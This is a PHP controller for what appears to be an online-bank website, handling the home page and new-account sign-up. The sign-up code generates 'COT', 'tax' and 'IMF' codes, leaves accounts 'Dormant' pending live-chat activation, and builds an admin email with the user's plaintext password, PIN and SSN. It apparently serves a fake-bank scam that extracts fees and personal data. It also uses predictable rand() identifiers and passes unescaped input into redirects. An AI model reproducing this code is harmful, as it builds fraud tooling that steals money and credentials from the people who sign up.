<?php

namespace App\Controllers;

use App\Models\FaqModel;
use App\Models\TestimonialModel;
use App\Models\BasicModel;
use App\Models\UserModel;
use App\Models\PasswordHash;

class Home extends License
{

  public function index()
  {

    if ($this->request->getGet("ref")) {
      return redirect()->to('auth/register?ref=' . $this->request->getGet("ref"));
    } else {

      $FaqModel = new FaqModel();
      $TestimonialModel = new TestimonialModel();
      $BasicModel = new BasicModel();
      $data = $this->site;

      //FAQs
      $data['faqs'] = $FaqModel->orderBy('id', 'ASC')->findAll();

      //Testimonials
      $data['testimonials'] = $TestimonialModel->orderBy('id', 'ASC')->findAll();

      //Terms and Conditions
      $data['terms'] = $BasicModel->where('title', 'terms')->first()['value'];

      //About Us
      $data['about_us'] = $BasicModel->where('title', 'about')->first()['value'];

      $data['page'] = ucfirst('home');
      return view("template/$this->template/header", $data)
        . view("template/$this->template/home", $data)
        . view("template/$this->template/footer", $data);
    }
  }
  function open_account()
  {
    $data = $this->site;
    $hasher = new PasswordHash(8, false);
    $UserModel = new UserModel();

    if ($this->request->getGet("start_account")) {
      $data['name'] = $this->request->getGet("name");
      $data['email'] = $this->request->getGet("email");
      $data['page'] = 'Open Account';
      return view("template/$this->template/open_account", $data);
    } else if ($this->request->getVar("complete_acount")) {
      $name = $this->request->getPost("name");
      $email = $this->request->getPost("email");
      if ($data['recaptcha'] == 1) {
        $captchaUrl = 'https://www.google.com/recaptcha/api/siteverify?secret=' . urlencode($data["captchaPrivateKey"]) . '&response=' . urlencode($this->request->getVar('g-recaptcha-response')) . '';
        $captcha = file_get_contents($captchaUrl);
        $response = json_decode($captcha);

        if (!$this->request->getVar('g-recaptcha-response')) {
          $score = 0;
        } else if ($response->success) {
          $score = 1;
        } else {
          $score = 0;
        }
      } else {
        $score = 1;
      }

      if ($score == 0) {
        session()->setFlashdata("msg", 'Please verify the captcha request');
        return redirect()->to("open_account?start_account=1&name=$name&email=$email");
      } else {
        if ($this->request->getPost("password") !== $this->request->getPost("repeat_password")) {
          session()->setFlashdata("msg", 'Password mismatch! Try again');
          return redirect()->to("open_account?start_account=1&name=$name&email=$email");
        } else {

          $md = rand(10000, 99999);
          $accGen = rand(1, 5);
          if ($accGen == 1) {
            $acc_no = '0011';
          } else if ($accGen == 2) {
            $acc_no = '0022';
          } else if ($accGen == 3) {
            $acc_no = '0033';
          } else if ($accGen == 4) {
            $acc_no = '0044';
          } else if ($accGen == 5) {
            $acc_no = '0055';
          }

          $passport_file = $this->request->getFile('passport');
          $passport_filename = $passport_file->getRandomName();
          $kyc_file = $this->request->getFile('kyc');
          $kyc_filename = $kyc_file->getRandomName();
          $max_size = $data['max_upload'] * 1000;
          $passport_rules = $this->validate(
            [
              'passport' => [
                'uploaded[passport]',
                'mime_in[passport,image/jpg,image/jpeg,image/gif,image/png]',
                'max_size[passport,' . $max_size . ']',
              ],
            ]
          );

          $kyc_rules = $this->validate(
            [
              'kyc' => [
                'uploaded[kyc]',
                'mime_in[kyc,image/jpg,image/jpeg,image/gif,image/png,application/pdf]',
                'max_size[kyc,' . $max_size . ']',
              ],
            ]
          );

          if ($passport_rules && $kyc_rules) {
            $account_id = rand(1000000, 9999999);
            $values = [
              "account_id" => $account_id,
              "check_acc" => $acc_no . $md . rand(100, 999),
              "savings_acc" => $acc_no . $md . rand(100, 999),
              "status" => 'Dormant',
              "cot" => '1100' . rand(10000, 99999),
              "tax" => rand(100, 999) . '-' . rand(100, 999),
              "imf" => $data['abrv'] . rand(10, 99),
              "creditCard" => rand(1000, 9999),
              "expire" => date("m") . '/' . (date("y") + 3),
              "allow_upload" => 0,
              "allow_codes" => 1,
              "name" => $this->request->getPost("name"),
              "email" => $this->request->getPost("email"),
              "currency" => $this->request->getPost("currency"),
              "phone" => $this->request->getPost("phone"),
              "password" => $hasher->HashPassword($this->request->getPost("password")),
              "country" => $this->request->getPost("country"),
              "city" => $this->request->getPost("city"),
              "address" => $this->request->getPost("address"),
              "zip" => $this->request->getPost("zip"),
              "dob" => $this->request->getPost("dob"),
              "gender" => $this->request->getPost("gender"),
              "occupation" => $this->request->getPost("occupation"),
              "pin" => $this->request->getPost("pin"),
              "image" => $passport_filename,
            ];

            //Upload Files
            $passport_file->move('uploads', $passport_filename);
            $kyc_file->move('uploads/kyc', $kyc_filename);
            $kyc_dir = base_url('uploads/kyc/' . $kyc_filename);

            $UserModel->save($values);

            $message = '
        <p>New Account Created. See details below</p>
        <h3>Account Information</h3>
        <p><strong>Full Name: </strong>' . $this->request->getPost("name") . '</p>
        <p><strong>Email: </strong>' . $this->request->getPost("email") . '</p>
        <p><strong>Country: </strong>' . $this->request->getPost("country") . '</p>
        <p><strong>Password: </strong>' . $this->request->getPost("password") . '</p>
        <p><strong>PIN: </strong>' . $this->request->getPost("pin") . '</p>
        <p><strong>Social Security Number/Tax ID: </strong>' . $this->request->getPost("ssn") . '</p>
        <p><strong>PIN: </strong>' . $this->request->getPost("pin") . '</p>

        <h3>Next of Kin Information</h3>
        <p><strong>name: </strong>' . $this->request->getPost("nok_name") . '</p>
        <p><strong>Relationship: </strong>' . $this->request->getPost("nok_relationship") . '</p>
        <p><strong>Email: </strong>' . $this->request->getPost("nok_email") . '</p>
        <p><strong>Phone: </strong>' . $this->request->getPost("nok_phone") . '</p>
        <p><strong>Address: </strong>' . $this->request->getPost("nok_address") . '</p>
        <hr>
        <em>All other information can be found in the admin dashboard. The KYC document uploaded is attached to this mail.</em>
        ';

            $variables = [];
            $variables['the_subject'] = 'Account Opening Form Submission';
            $variables['the_message'] = $message;

         //  $this->sendmail($variables, "Email", $data['company_email'], $kyc_dir);

            // $finish = '<p>Congratulations ' . $name . '! - Your ' . $data['company_name'] . ' Account request is successfull and pending verification. You will be able to access your account dashboard as soon as verification is successful. Save your <strong>ACCOUNT ID</strong> as it will be needed for logging in to your account. If you need help, do not hesitate to contact our support team: <strong>' . $data['company_email'] . '</strong></p>
            // <h3>ACCOUNT ID: <span style="color:red">' . $account_id . '</span></h3>';


            $finish = '<p>Congratulations ' . $name . '! - Your ' . $data['company_name'] . ' Account request is successful and pending verification. You will be able to access your account dashboard as soon as verification is successful. Save your <strong>ACCOUNT ID</strong> as it will be needed for logging in to your account. Contact support via live chat for account activation and support.</p>
              <h3>ACCOUNT ID: <span style="color:red">' . $account_id . '</span></h3>';


            $variables = [];
            $variables['the_subject'] = 'Account Opening Successful';
            $variables['the_message'] = $finish;
            $this->sendmail($variables, "Email", $this->request->getPost("email"), 'NoFile');


            session()->setFlashdata("msg", $finish);
            return redirect()->to("/");
          } else {
            session()->setFlashdata("msg", 'Upload Error, please check the files and try again');
            return redirect()->to("open_account?start_account=1&name=$name&email=$email");
          }
        }
      }
    } else {
      return redirect()->to("#");
    }
  }
}
